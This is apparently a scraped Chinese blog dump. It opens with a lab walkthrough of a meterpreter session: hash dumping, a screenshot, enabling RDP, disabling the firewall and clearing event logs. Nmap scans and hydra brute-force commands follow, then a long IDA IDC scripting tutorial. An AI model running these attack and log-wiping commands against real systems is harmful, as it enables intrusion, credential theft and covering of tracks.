=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 然后我们就已经连接上了靶机 12345678r &gt; pwdC:\\Windows\\system32meterpreter &gt; getuidServer username: NT AUTHORITY\\SYSTEMmeterpreter &gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:4f22769af1bc95bd80b5545aa5d3709d:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::meterpreter &gt; 在获取了关键信息后,我们可以去网站解密 https://www.cmd5.com/ 然后我们还可以偷窥隐私 12meterpreter &gt; screenshotScreenshot saved to: /home/re4mile/桌面/mEiCsjPY.jpeg 下载文件 1 进入靶机的shell环境(cmd) 1meterpreter &gt; shell 然后开始干坏事 开启3389远程端口 1wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1 执行结果 1234567891011121314151617meterpreter &gt; shellProcess 992 created.Channel 2 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\Windows\\system32&gt;wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1Executing (\\\\WIN-8NG4AVCAK1F\\ROOT\\CIMV2\\TerminalServices:Win32_TerminalServiceSetting.ServerName=&quot;WIN-8NG4AVCAK1F&quot;)-&gt;SetAllowTSConnections()Method execution successful.Out Parameters:instance of __PARAMETERS&#123; ReturnValue = 0;&#125;; 关闭靶机防火墙 1234C:\\Windows\\system32&gt;netsh advfirewall set allprofiles state offnetsh advfirewall set allprofiles state offȷ���� 先关闭防火墙,开启3389,然后登录远程桌面 1root@KALI:~# rdesktop -u Administrator -p Qw1234 192.168.205.132 清楚靶机日志 12345678C:\\Windows\\system32&gt;exit exitmeterpreter &gt; clearev[*] Wiping 96 records from Application...[*] Wiping 114 records from System...[*] Wiping 96 records from Security...meterpreter &gt; 解决办法:利用系统防火墙高级设置阻止向445端口进行连接 扫描技术 扫描软件 nmap 123456nmap -sP 192.168.101.0/24 查看该网段在线的用户nmap -O 192.168.101.33 查看该用户开启的端口和一些信息nmap -p 21,23,80 192.168.101.33 查看对应用户的端口是否开放了nmap -sV -p 3306,80 192.168.101.33 查看对应用户的对应端口是用什么开放的nmap -sV -A 192.168.101.33 全面扫描nmap -O 192.168.101.33 -oN D:/q.txt 暴力破解软件 123456789hydra.exe -l administrator -p 12822 192.168.101.2 telnethydra.exe -L E:/user.txt\t-P E:/pass.txt 192.168.101.2 http-proxy还有很多服务telnethttp-proxysmbftpsshmysql 破解系统密码基于PE破解 基于漏洞破解 5次shift 远程爆破 nmap&#x2F;NTsann&#x2F;Hydra 基于内存破解密码,也就是你的密码会写入缓冲区.常见工具 Getpass 基于缓存 pwdump(QuarksPWDump) saminside 1QuarksPWDump QuarksPWDumps是爆破sam文件的哈希表","tags":["简单漏洞"],"categories":["web"]},{"title":"IDC脚本学习","path":"/re4mile/2021/06/07/re/IDA/IDC/re/","content":"参考链接🧡参考链接: lyshark https://www.cnblogs.com/LyShark/p/13100048.html https://introspelliam.github.io/2017/09/18/tools/IDA%E7%9A%84%E8%B0%83%E8%AF%95%E8%84%9A%E6%9C%ACidc/ 在IDA中按下【shift + F2】可调出脚本编辑器 就IDApython的话,感觉比价火 但是,我喜欢C,IDC的参考指令可以说,巨少 https://www.hex-rays.com/products/ida/support/idadoc/ 有本事去把每个链接点一下,然后去总结一个函数的目录和列表 HeloWorld123456#include &lt; idc&gt;static main()&#123; Message(&quot;HelloWorld &quot;);&#125; 数据类型IDC中所有变量都被定义成auto类型，会自动进行类型转换，一般类型有整数型、字符串类型、浮点型 变量在没有赋予初始值的情况下,为0 局部变量：auto counter; extern 引入全局变量的声明，extern outsideGlobal; 字符串支持加好连接：auto str &#x3D; “hello” + “world”; 字符串支持分片操作：str1 &#x3D; str[7:9]; 没有strcat…等等函数 12auto addr, reg, val; //没有初始化声明的多个变量auto count = 0; //已声明和初始化 12345678910extern outsideGlobal;static main()&#123;\textern insideGlobal;\toutsideGlobal = &quot;Global&quot;;\tinsideGlobal = 1;&#125; 虽然IDC没有数组数据类型,但你可以使用分片运算符来处理IDC字符串, 就好像他们是数组一样,IDC分片的用法： 1234567auto str = &quot;String to slice&quot;;auto s1, s2, s3, s4;s1 = str[7:9]; //&#x27;to&#x27;s2 = str[ :6]; //&#x27;String&#x27;s3 = str[10: ]; //&#x27;slice&#x27;s4 = str[5]; //&#x27;g&#x27; 字符串操作1234if ( op == &quot;jmp&quot; || op == &quot;call&quot; )&#123;\t...&#125; 1234567891011121314151617181920#include &lt;idc.idc&gt;static main()&#123; // 格式化字符串,类似于sprintf auto name = form(&quot;hello %s&quot;,&quot;lyshark&quot;); Message(&quot;格式化后的内容: %s &quot;,name); Message(&quot;十六进制转为整数: %d &quot;,xtol(&quot;0x41&quot;)); Message(&quot;十进制100转为八进制: %d &quot;,ltoa(100,8)); Message(&quot;十进制100转换二进制: %d &quot;,ltoa(100,2)); Message(&quot;字符A的ASCII: %d &quot;,ord(&quot;A&quot;)); Message(&quot;计算字符串长度: %d &quot;,strlen(&quot;hello lyshark&quot;)); // 在著字符串中寻找子串 auto main = &quot;hello lyshark&quot;; auto sub = &quot;lyshark&quot;; Message(&quot;寻找子串: %d &quot;,strstr(main,sub));&#125; 数组一个例子就可以搞懂 12345678910111213141516171819202122232425262728293031323334#include &lt;idc.idc&gt;static main()&#123; // 创建数组元素 auto ObjArr = CreateArray(&quot;array&quot;); // 获取数组指针 auto lp_Arr = GetArrayId(&quot;array&quot;); Message(&quot;Arr: %X &quot;, lp_Arr); // 设置两个字符串变量 SetArrayString(lp_Arr, 0, &quot;hello&quot;); SetArrayString(lp_Arr, 1, &quot;re4mile&quot;); // 设置两个整数变量 SetArrayLong(lp_Arr, 2, 100); SetArrayLong(lp_Arr, 3, 200); // 如果提取字符串使用 AR_STR 标记 ，提取整数使用 AR_LONG auto sz1 = GetArrayElement(AR_STR, lp_Arr, 0); auto sz2 = GetArrayElement(AR_STR, lp_Arr, 1); Message(&quot;字符串: %s %s ! &quot;, sz1, sz2); auto num1 = GetArrayElement(AR_LONG, lp_Arr, 2); auto num2 = GetArrayElement(AR_LONG, lp_Arr, 3); Message(&quot;整数: %d %d &quot;, num1,num2); // 删除数组的0号元素 DelArrayElement(AR_STR, lp_Arr, 0); // 注销整个数组 DeleteArray(lp_Arr);&#125; 运算符许多标准的C语言操作符（+、-、*、&#x2F;、%、&lt;&lt;、&gt;&gt;、++、–）包括三元运算符（?:) 在IDC同样适用，但复合赋值运算符+=不支持、逗号操作符也不被支持。 IDC几乎支持C中的所有运算和逻辑操作符，但是所有整数操作数均作为有符号的值处理。 这会影响到整数比较与右移位运算。如果需要进行逻辑右移位运算，你必须修改结果的最高位，自己移位， 如下代码： 1result = ( x &gt;&gt; 1 ) &amp; 0x7fffffff; //将最大有效位设置为0 与C语言一样，IDC所有简单语句均以分号结束。 Switch语句是IDC唯一不支持的C风格复合语句。 在使用for语句时IDC不支持复合赋值运算符，如果你希望以除1以外的其他值为单位进行计数，就需要注意这一点， 如下代码： 12345678910auto i;for (i = 0; i &lt; 10; i += 2) &#123; &#125; //不合法，不支持 +=for (i = 0; i &lt; 10; i = i + 2)&#123; &#125; //合法 1 函数定义定义一个函数 12345678910111213141516#include &lt; idc&gt;// 定义一个函数static OutPutAddress(My)&#123; auto tmp; tmp = 0x1300 + My; return tmp;&#125;static main()&#123; auto ret = OutPutAddress(0x14); Message(&quot;%x &quot;,ret);&#125; 宏定义BADADDR &#x3D; -1 IDC-Example这个师傅写了很多的IDC例子 你自己可以跟着学习 patch12345678910111213141516171819202122//文件名：test.idc#include &lt;idc.idc&gt;static main() &#123; auto x,FBin,ProcRange; FBin = &quot;E8 0A 00 00 00 E8 EB 0C 00 00 E8 F6 FF FF FF&quot;; //目标 = &quot;E8 0A tel:00 00 00 90 EB 0C tel:90 90 90 90 90 90 90&quot;; //花指令1的特征码 for (x = FindBinary(MinEA(),0x03,FBin);x != BADADDR;x = FindBinary(x,0x03,FBin)) &#123; x=x+5; //返回的x是第一个E8的地址， //加上5是第二个E8的地址 PatchByte (x,0x90);//nop掉 x = x + 3; //00 PatchByte (x,0x90); x++; //00 E8 PatchWord (x,0x9090); x =x + 2 ; //F6 FF FF FF PatchDword(x,0x90909090); &#125;&#125; 高亮1234567891011121314151617181920#include &lt;idc.idc&gt;static main(void)&#123; auto head, op; head = NextHead(0x00000000, 0xFFFFFFFF); while ( head != BADADDR ) &#123; op = GetMnem(head); Message(&quot;%x %s &quot;,head,op); if ( op == &quot;jmp&quot; || op == &quot;call&quot; ) SetColor(head, CIC_ITEM, 0x010187); if (op == &quot;xor&quot;) SetColor(head, CIC_ITEM, 0x010198); head = NextHead(head, 0xFFFFFFFF); &#125;&#125; 将函数的名字dump到本地,dump出的文件名字是xxxfile_name_dump.log 文件的路径与你的xxx.exe相同 dump数据1234567auto i,fp;fp = fopen(&quot;d:\\\\dump.dex&quot;,&quot;wb&quot;);for(i=0x46B6D000;i&lt;0x46B6f000;i++)&#123; fputc(Byte(i),fp);&#125; 不懂1234567891011121314151617181920212223242526272829#include &lt;idc.idc&gt;static main(void)&#123;\tauto decode = 0x401000;\tauto xref; Message(&quot;xref: start &quot;);\tfor(xref = RfirstB(decode); xref != BADADDR; xref = RnextB(decode,xref))\t&#123; Message(&quot;xref: %x &quot;,xref);//交叉引用的上一个地址 auto i = 0; auto inst = xref; auto op; while((i &lt; 100) ) &#123; inst\t= FindCode(inst,0x00); // flag set to backwards op = GetDisasm(inst); // get Message(&quot;%x --&gt; %s &quot;,inst,op); i++; &#125;\t&#125; Message(&quot;xref: end&quot;);&#125; IDC-API手册https://www.hex-rays.com/products/ida/support/idadoc/162.shtml 其实就是 jmp 到当前位置+1 1234567EB FF jmp short near ptr loc_1144+1------------------------------------------------------------- dw 0BFC0h dq 0FFFEDFE800000068h, 65BFC0FFEBFFh, 0FFEBFFFFFED2E800h dq 0C5E80000006CBFC0h, 6CBFC0FFEBFFFFFEh, 0FFFFFEB8E8000000h dq 6FBFC0FFEBh, 0C0FFEBFFFFFEABE8h, 0FE9EE800000020BFh dq 77BFC0FFEBFFFFh, 0EBFFFFFE91E80000h, 0E80000006FBFC0FFh 他的特征代码是EB FF EB是jmp FF是偏移 于是这种没有意义的跳转应该给nop掉 12345EB db 0EBh;---------------------------------------------------------------------------FF C0 inc eaxBF 68 00 00 00 mov edi, 68h ; &#x27;h&#x27;E8 DF FE FF FF call _putchar 如果程序中有大量的这种花指令.那么你不可能手动的一个一个去nop掉 用脚本 12345678910#include &lt; idc&gt;static main()&#123; auto x, target_str, ProcRange; target_str = &quot;EB FF C0 BF&quot;; for (x = FindBinary(MinEA(), 0x03, target_str); x != BADADDR; x = FindBinary(x, 0x03, target_str)) &#123; PatchByte(x, 0x90); &#125;&#125; FindBinary(MinEA(), 0x03, target_str)的意思是? 从地址MinEA()处按0x03的模式遍历字节码target_str MinEA()是最小的地址 PatchByte(x, 0x90);是把x指向的第一个字节给nop掉 数据读取修改PatchByte&#x2F;Word&#x2F;Dword1void PatchByte(long addr , long val) 设置虚拟地址addr处的一个字节值， PatchByte可更换为 PatchWord，PatchDword 设置虚拟地址addr处的2字节和4字节值。 Byte&#x2F;Word&#x2F;Dwordlong Byte( long addr)，从虚拟地址 addr处读取一个字节值。 long word(long addr)，从虚拟地址addr处读取一个字（2字节）值。 1ong Dword(long addr)，从虚拟地址addr处读取一个双字（4字节)值。 isLoadedboo1 isLoaded(long addr)，如果addr包含有效数据，则返回1，否则返回0。 5）long atol（string val），将10进制val转化成对应整数值。 6）long xtol（string val），将16进制val转化成对应整数值。 7）long ord（string ch），返回单字符字符串ch的ASCII值。 8）string Name（long addr），返回与给定地址有关的名称，如果该位置没有名称，则返回空字符串。 用户交互函数Messagevoid Message(string format….)， 在输出窗口打印一条格式化消息。这个函数类似于C语言的printf函数，并接受printf风格的格式化字符串。 printvoid print( . ..)， 在输出窗口中打印每个参数的字符串表示形式。 warningvoid warning(string format. …)， 在对话框中显示一条格式化消息。 AskStrstring AskStr(string default, string prompt)， 显示一个输入框，要求用户输入一个字符串值。 如果操作成功，则返回用户的字符串; 如果对话框被取消，则返回0。 AskFilestring AskFile(1ong doSave，string mask,string prompt)， 显示一个文件选择对话框，以简化选择文件的任务。 你可以创建新文件保存数据( doSave&#x3D;1)，或选择现有的文件读取数据（ doSave&#x3D;0)。 你可以根据mask （如* .或. idc)过滤显示的文件列表。 如果操作成功，则返回选定文件的名称; 如果对话框被取消,则返回O。 AskYNlong AskYN( long default, string prompt)， 用一个答案为“是”或“否”的问题提示用户， 突出一个默认的答案(1为是，0为否，-1为取消)。 返回值是一个表示选定答案的整数。 ScreenEAlong ScreenEA(), 返回当前光标所在位置的虚拟地址 123456789#include &lt; idc&gt;static main()&#123; auto CurrAddress = ScreenEA(); //ScreenEA() 返回当前光标所在的虚拟地址 Message(&quot;程序OEP =&gt; 0x%x &quot;,CurrAddress);&#125; Jumpboo1 Jump( 1ong addr)，跳转到反汇编窗口的指定地址。 因为IDC没有任何调试工具，你可能需要将Message 函数作为你的主要调试工具。 其他几个AskXXX函数用于处理更加专用的输人，如整数输人。请参考帮助系统文档了解可用的 AskXXX函数的完整列表。 如果希望创建一个根据光标位置调整其行为的脚本，这时，ScreenEA函数就非常有用，因为你可以通过它确定光标的当前位置。 同样，如果你的脚本需要将用户的注意力转移到反汇编代码清单中的某个位置，也需要用到Jump函数。 字符串操作函数formstring form(string format，…) &#x2F;&#x2F;preIDA5.6，返回一个新字符串，该字符串根据所提供的格式化字符串和值进行格式化。这个函数基本上等同于C语言的sprintf函数 sprintf1string sprintf(string format . . . .) &#x2F;&#x2F;IDA5.6+，在 IDA5.6中，sprintf用于替代form(参见上面)。 atol1ong ato1(string va1)，将十进制值va1转换成对应的整数值。 xtol1ong xtol(string val)，将十六进制值val(可选择以0x开头）转换成对应的整数值。 1Message(&quot;十六进制转为整数: %d &quot;,xtol(&quot;0x41&quot;)) ltoastring ltoa(1ong va1，1ong radix)， 以指定的radix (2、8、10或16)返回va1的字符串值。 1Message(&quot;十进制100转为八进制: %d &quot;,ltoa(100,8)); ordlong ord(string ch)，返回单字符字符串ch 的ASCI值。 1Message(&quot;字符A的ASCII: %d &quot;,ord(&quot;A&quot;)); strlenlong strlen(string str)，返回所提供字符串的长度。 1Message(&quot;计算字符串长度: %d &quot;,strlen(&quot;hello re4mile&quot;)); strstrlong strstr(string str. string substr)， 返回str中 substr 的索引。 如果没有发现子字符串，则返回-1。 12345if(strstr(op,&quot;push esi&quot;)==0)&#123;\t...&#125;其实他就是一个strcmp的作用,如果返回0,说明字符串刚好匹配 substrstring substr(string str. long start.1ong end)， 返回包含 str 中由start到end-1位置的字符的子字符串。 如果使用分片（IDA5.6及更高版本)，此函数等同于str[start:end]。如前所述，IDC中没有任何字符数据类型，它也不支持任何数组语法。 如果你想要遍历字符串的每个字符，必须把字符串中的每个字符当成连续的单字符子字符串处理。 文件操作输出窗口并不总是显示脚本输出的理想位置 对于生成大量文本或二进制数据的脚本，你可能希望将其结果输出到磁盘文件上。 我们已经讨论了如何使用AskFi1e函数要求用户输入文件名。 但是，AskFi1e仅返回一个包含文件名的字符串值。 IDC的文件处理函数如下所示。 fopenlong fopen(string filename，string mode) 返回一个整数文件句柄（如果发生错误，则返回0) 供所有IDC文件输入&#x2F;输出函数使用 mode参数与C语言的fopen 函数使用的模式( r表示读取，w表示写入，等等）类似 fclosevoid fclose(long hand1e) 关闭fopen中文件句柄指定的文件。 filelengthlong filelength(long handle) 返回指定文件的长度， 如果发生错误，则返回-1。 fgetc1ong fgetc(long handle)，从给定文件中读取一个字节 如果发生错误，则返回-1。 fputclong fputc(long val. long handle)，写入一个字节到给定文件中 如果操作成功，则返回0; 如果发生错误，则返回-1。 fprintflong fprintf(1ong handle, string format，…) 将一个格式化字符串写入到给定文件中。 writestrlong writestr(long handle. string str)，将指定的字符串写入到给定文件中。 readstrstring&#x2F;long readstr(1ong handle)，从给定文件中读取一个字符串 这个函数读取到下一个换行符为止的所有字符（包括非ASCII字符)，包括换行符本身(ASCII OxA )。 如果操作成功，则返回字符串; 如果读取到文件结尾，则返回-1。 writelonglong writelong(long handle. long va1， long bigendian) 使用大端(bigendian-1)或小端( bigendian&#x3D;0)字节顺序将一个4字节整数写入到给定文件。 readlonglong readlong( long handle,long bigendian) 使用大端(bigendian&#x3D;1) 或小端( bigendian&#x3D;-Q)字节顺序从给定的文件中读取一个4字节整数。 writeshortlong writeshort(long handle，long va1,long bigendian) 使用大端( bigendian&#x3D;1)或小端( bigendian&#x3D;0)字节顺序将一个2字节整数写入到给定的文件。 readshortlong readshort( 1ong handle,long bigendian) 使用大端(bigendian-1)或小端( bigendian&#x3D;0)字节顺序从给定的文件中读取一个2字节整数。 loadfilebool loadfile(long handle.long pos，long addr. long length) 从给定文件的pos位置读取length数量的字节，并将这些字节写入到以addr地址开头的数据库中。 savefilebool savefile(long handle，1ong pos.long addr. long length) 将以addr数据库地址开头的length数量的字节写入给定文件的pos位置。 eg 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;idc.idc&gt;static getFuncName(ea)&#123; auto funcName = get_func_name(ea); auto dm = demangle_name(funcName, get_inf_attr(INF_LONG_DN)); if (dm != 0) &#123; funcName = dm; &#125; return funcName;&#125;static functionDump(ip_CurFuncStart)&#123; auto funcName = 0; auto ip_CurFuncEnd = 0x0; auto ip_NextFuncStart; auto sz_FileName = get_idb_path()[0:-4] + &quot;_dump.txt&quot;; auto fp = fopen(sz_FileName, &quot;w&quot;); auto appendData = 0; while (ip_CurFuncStart != BADADDR) &#123; ip_CurFuncStart = NextFunction(ip_CurFuncStart); ip_CurFuncEnd = FindFuncEnd(ip_CurFuncStart); ip_NextFuncStart = NextFunction(ip_CurFuncStart); funcName = getFuncName(ip_CurFuncStart); if (ip_NextFuncStart == BADADDR) &#123; fprintf(fp, &quot;0x%08X --&gt; 0x%08X %s &quot;, ip_CurFuncStart, ip_CurFuncEnd, funcName); ip_CurFuncStart = ip_NextFuncStart; continue; &#125; appendData = ip_NextFuncStart - ip_CurFuncEnd; // ip_CurFuncEnd = ip_NextFuncStart - 1;//他们之间的差别不仅仅是1,因为会有字节的填充 fprintf(fp, &quot;0x%08X --&gt; 0x%08X + 0x%08X %s &quot;, ip_CurFuncStart, ip_CurFuncEnd, appendData,funcName); &#125; fclose(fp);&#125;static main()&#123;\tMessage(&quot;Start &quot;); functionDump(0x00040000);\tMessage(&quot;End &quot;);&#125; 操作数据库名称在脚本中，你经常需要操纵已命名的位置。下面的IDC函数用于处理IDA数据库中已命名的位置。 Namestring Name(1ong addr)， 返回与给定地址有关的名称， 如果该位置没有名称，则返回空字符串。 如果名称被标记为局部名称，这个函数并不返回用户定义的名称。 NameExstring NameEx(long from，long addr)，返回与addr有关的名称。如果该位置没有名称，则返回空字符串。 如果 from是一个同样包含addr的函数中的地址，则这个函数返回用户定义的局部名称。 MakeNameExbool MakeNameEx(1ong addr. string name. long flags)， 将给定的名称分配给给定的地址。该名称使用flags位掩码中指定的属性创建而成。 这些标志在帮助系统中的MakeNameEx文档中有记载描述， 可用于指定各种属性，如名称是局部名称还是公共名称、名称是否应在名称窗口中列出 LocByNamelong LocByName(string name)，返回一个位置（名称已给定）的地址。如果数据库中没有这个名称，则返回BADADDR ( -1 )。 LocByNameExlong LocByNameEx(long funcaddr， string loca 1name)，在包含funcaddr的函数中搜索给定的局部名称。如果给定的函数中没有这个名称，则返回BADADDR ( -1 )o 操作数据库的函数有大量函数可用于对数据库的内容进行格式化。这些函数如下所示。 MakeUnknvoid MakeUnkn(long addr. long flags)， 取消位于指定地址的项的定义。 这里的标志(参见IDC的MakeUnkn文档）指出是否也取消随后的项的定义 以及是否删除任何与取消定义的项有关的名称。 相关函数MakeUnknown 允许你取消大块数据的定义。 MakeCodelong MakeCode(1ong addr)， 将位于指定地址的字节转换成一条指令。 如果操作成功，则返回指令的长度， 否则返回0。 MakeBytebool MakeByte(long addr)， 将位于指定地址的项目转换成一个数据字节。 类似的函数还包括Makeword和 MakeDword。 MakeCommboo1 MakeComm(long addr. string comment)， 在给定的地址处添加一条常规注释。 MakeFunctionbool MakeFunction(long begin，long end)， 将由begin到end 的指令转换成一个函数。如果end被指定为BADADDR ( -1)，IDA会尝试通过定位函数的返回指令，来自动确定该函数的结束地址。 开始的地址,比如说push esi 结束的地址, retn那个地址不是结束,retn之外那个地址,才是,结束的地址不属于函数地址,是函数地址的边界 1234567891011121314151617181920212223#include &lt;idc.idc&gt;static Y_MakeFunction(IP_start,IP_end)&#123; auto tmp=0;//先从开始的IP取消定义,然后再生成函数 tmp=MakeFunction(IP_start,IP_end); if(tmp==1) &#123; Message(&quot;make func ok &quot;); &#125; else &#123; Message(&quot;make func failed &quot;); &#125;&#125;static main(void)&#123; Message(&quot;work begin &quot;); Y_MakeFunction(0x0040A188,0x0040A1AA); Message(&quot;work done &quot;); &#125; 运行输出 123work beginmake func okwork done MakeStrbool MakeStr(1ong begin，long end)， 创建一个当前字符串(由GetStringType返回)类型的字符串, 涵盖由begin到end-1之间的所有字节。 如果end被指定为BADADDR,IDA会尝试自动确定字符串的结束位置。 数据库搜索函数在IDC中，IDA的绝大部分搜索功能可通过各种FindXXX函数来实现，下面我们将介绍其中一些函数。FindXXX函数中的flags参数是一个位掩码，可用于指定查找操作的行为。3个最为常用的标志分别为SEARCH_DOWN，它指示搜索操作扫描高位地址;SEARCH_NEXT，它略过当前匹配项，以搜索下一个匹配项;SEARCH_CASE，它以区分大小写的方式进行二进制和文本搜索。 FindCodelong FindCode(long addr, long flags)， 从给定的地址搜索一条指令。 FindDatalong FindData(long addr.long flags)，从给定的地址搜索一个数据项。 FindBinary1long FindBinary(long addr，long flags，string binary) 从给定的地址addr搜索16进制字符串序列 binary 返回该字节码出现的地址 1234567flag取值有：可选项 SEARCH_DOWN 向下搜索SEARCH_UP 向上搜索SEARCH_NEXT 获取下一个找到的对象。SEARCH_CASE 指定大小写敏感度SEARCH_UNICODE 搜索 Unicode 字符串。 FindTextlong FindText(long addr.long flags.1ong row.long column，string text)， 在给定的地址，从给定行( row)的给定列搜索字符串text。注意，某个给定地址的反汇编文本.可能会跨越几行，因此,你需要指定搜索应从哪一行开始。还要注意的是，SEARCH_NEXT并未定义搜索的方向，根据SEARCH_DOWN 标志，其方向可能向上也可能向下。此外，如果没有设置SEARCH_NEXT，且 addr位置的项与搜索条件匹配，则FindXXX函数很可能会返回addr参数传递给该函数的地址。 操作函数许多脚本专用于分析数据库中的函数。 IDA为经过反汇编的函数分配大量属性，如函数局部变量区域的大小、函数的参数在运行时栈上的大小。 下面的IDC函数可用于访问与数据库中的 GetFunctionAttrlong GetFunctionAttr(long addr, 1ong attrib)， 返回包含给定地址的函数的被请求的属性 例如，要查找一个函数的结束地址，可以使用GetFunctionAttr(addr. FUNCATTR_END) 12funcStart = GetFunctionAttr(origEA,FUNCATTR_START);funcEnd = GetFunctionAttr(origEA,FUNCATTR_END) GetFunctionName1string GetFunctionName(long addr) 参数是一个指令的地址 返回当前指令属于哪个函数 如果给定的地址并不属于一个函数，则返回一个空格字符串” “ NextFunctionauto NextFunction(auto addr)， 返回给定地址后的下一个函数的起始地址。 如果数据库中给定地址后没有其他函数，则返回-1。 PrevFunction1ong PrevFunction(1ong addr)， 返回给定地址之前距离最近的函数的起始地址。 如果在给定地址之前没有函数，则返回-1。 根据函数的名称，使用LocByName函数查找该函数的起始地址。 代码交叉引用函数Rfirstlong Rfirst(long from)， 返回给定地址向其转交控制权的第–个位置。 如果给定的地址没有引用其他地址，则返回BADADDR ( -1 ) Rnextlong Rnext(1ong from，long current)， 如果current 已经在前一次调用Rfirst或Rnext时返回, 则返回给定地址( from )转交控制权的下一个位置。 如果没有其他交叉引用存在，则返回BADADDR。 XrefTypelong XrefType()， 返回-个常量，说明某个交叉引用查询函数（如Rfirst) 返回的最后一个交叉引用的类型。对于代码交叉引用，这些常量包括fl_CN(近调用)、fl_CF(远调用)、f1_JN（近跳转)、f1_JF（远跳转）和f1_F(普通顺序流)。 RfirstBlong RfirstB(long to)， 返回 转交控制权到给定地址的第一个位置。 如果不存在对给定地址的交叉引用，则返回BADADDR( -1 )。 RnextBlong RnextB(1ong to. long current)， 如果current 已经在前一次调用RfirstB或RnextB时返回，则返回下一个转交控制权到给定地址(to)的位置。 如果不存在其他对给定位置的交叉引用，则返回BADADDR ( -1 ). 每次调用一个交叉引用函数， IDA都会设置一个内部 IDC状态变量,指出返回的最后一个交叉引用的类型。如果需要知道你收到的交叉引用的类型,那么在调用其他交叉引用查询函数之前，必须调用XrefType函数。 数据交叉引用访问数据交叉引用信息的函数与访问代码交叉引用信息的函数非常类似。这些函数如下所示。 Dfirstlong Dfirst(long from)， 返回给定地址引用一个数据值的第–个位置。 如果给定地址没有引用其他地址，则返回BADADDR ( -1 )。 Dnextlong Dnext(1ong from，long current) 如果current已经在前–次调用Dfirst或Dnext时返回，则返回给定地址( from ) 向其引用一个数据值的下一个位置。 如果没有其他交叉引用存在，则返回BADADDR。 XrefType()long XrefType()，返回一个常量，说明某个交叉引用查询函数（如 Dfirst)返回的最后一个交叉引用的类型。 对于数据交叉引用，这些常量包括dr_0(提供的偏移量)、dr_w(数据写人）和dr_R（数据读取) DfirstBlong DfirstB(1ong to) 返回将给定地址作为数据引用的第一个位置。 如果不存在引用给定地址的交叉引用，则返回BADADDR ( -1 )。 DnextBlong DnextB(long to，1ong current)，如果currnet 已经在前一次调用DfristB或DnextB时返回，则返回将给定地址( to)作为数据引用的下一次位置。如果没有其他对给定地址的交叉引用存在，则返回BADADDR。和代码交叉引用一样，如果需要知道你收到的交叉引用的类型，那么在调用另一个交叉引用查询函数之前，必须调用XrefType函数。 反汇编提取许多时候，我们需要从反汇编代码清单的反汇编行中提取出文本或文本的某个部分。下面的函数可用于访问反汇编行的各种组件 GetDisasmstring GetDisasm(long addr)，返回给定地址的反汇编文本。返回的文本包括任何注释，但不包括地址信息 返回该地址的反汇编指令 12345678910#include &lt;idc.idc&gt;static main()&#123; auto currAddr=0; auto op =&quot; &quot;; currAddr\t= ScreenEA(); op=GetDisasm(currAddr); Message(&quot;%s &quot;,op); &#125; 输出 1mov edx, dword_445BD8 注意返回的字符串,mov和edx之间是4个空格 GetMnem1string GetMnem( auto addr) 返回位于给定地址的汇编指令,比如返回”call”,”jmp” 如果该地址没有指令与之匹配就返回” “ GetOpndstring GetOpnd(long addr. long opnum)， 返回指定地址汇编指令的的操作数 IDA以0为起始编号，从左向右对操作数编号。 GetOpTypelong GetOpType(long addr.long opnum)，返回一个整数，指出给定地址的给定操作数的类型。请参考GetOpType的 IDC文档，了解操作数类型代码。 GetOperandValuelong GetOperandValue(long addr. long opnum)，返回与给定地址的给定操作数有关的整数值。返回值的性质取决于GetOpType指定的给定操作数的类型。15.5 IDC脚本示例211string CommentEx(long addr. long type)，返回给定地址处的注释文本。如果type为0,则返回常规注释的文本;如果type为1，则返回可重复注释的文本。如果给定地址处没有注释,则返回一个空字符串。 misc-funcMinEA() MaxEA() 获取当前idb 的最小地址 和 最大地址 ScreenEA() 获取当前光标所在行的地址, 返回一个 int 类型 SegName(ea) ea是一个变量存储当前地址, 这个api 是获取当前地址所在的段 GetDisasm(ea) 获取当前地址的反汇编代码 GetMnem(ea) 获取当前地址的操作码 GetOpnd(ea,0) 获取当前地址的操作数,第二个参数表示哪一个操作数 SegStart(ea) 获取当前地址所在段的起始地址 SegEnd(ea) 获取当前地址的段尾地址 NextSeg(ea) 获取下一个段的起始地址 idautils.Segments() 返回一个可迭代的对象数组 GetFunctionName(func) 通过地址,获取函数的名称 idautils.Functions() 返回一个可迭代的函数首地址数组, idaapi.get_func(ea) 获取当前地址的函数首地址和尾地址 NextFunction(ea) 获取下一个函数地址,ea的值可能在函数里面,也可能在函数外面,但是会返回下一个函数的首地址 PrevFunction(ea) 获取前一个函数地址 GetFunctionAttr(ea,FUNCATTR_START) 获取一个函数的边界地址 GetDunctionAttr(ea,FUNCATTR_END) 获取一个函数的边界地址 NextHead 123auto NextHead(auto 当前地址,auto 结尾地址) //head = NextHead(startOEP, End_FUnc);//head = NextHead(0x00000000, 0xFFFFFFFF); 获取一个当前指令的下一个指令的地址,遍历结束返回-1 函数的不足是: 如果遇到花指令,比如 1234A1AA F9 stcCAT1:0040A1AB 72 03 jb short loc_40A1B0CAT1:0040A1AD db 64hCAT1:0040A1AD 64 E3 8F jecxz short loc_40A13F 他是不会返回db 64h的地址的 SetColor 1SetColor(auto 地址, CIC_ITEM, 16进制颜色值); get_idb_path()[0:-4] 123456#include &lt;idc.idc&gt;static main(void)&#123; Message(&quot;%s &quot;,get_idb_path()[0:-4]);&#125;//输出当前文件所在目录,具体是当前idb文件所在目录 附录一个很好的IDA资源插件介绍,没去下载应用 https://www.dazhuanlan.com/sisiyoki/topics/1183415","tags":["IDA"],"categories":["Tool"]},{"title":"C Exception","path":"/re4mile/2021/06/07/re/Exception/C/re/","content":"参考链接https://zhuanlan.zhihu.com/p/103258431 https://zhuanlan.zhihu.com/p/382909501 导入（SEH链表是局部链表，在堆栈中） VC++中，通过提供四个微软关键字使得程序员能够良好的使用这一机制 1__try、 __finally、 __except、 __leave 1无论 __try 块中的指令以何种方式退出，都必然会执行 __finally 块 